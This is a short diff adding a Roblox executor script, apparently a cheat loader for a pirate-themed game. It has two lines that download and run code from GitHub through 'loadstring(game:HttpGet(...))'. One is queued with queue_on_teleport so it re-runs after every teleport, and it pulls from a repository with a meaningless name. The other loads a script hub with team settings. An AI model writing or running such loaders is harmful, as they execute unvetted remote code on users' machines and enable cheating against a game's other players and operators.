@@ -1,1 +1,8 @@
+queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/no1one1lmao/dfgdfgdfg/refs/heads/main/gfdhfghfh')()")
 
+local Settings = {
+  JoinTeam = "Pirates";
+  Translator = false;
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Scripts/refs/heads/main/main.luau"))(Settings)
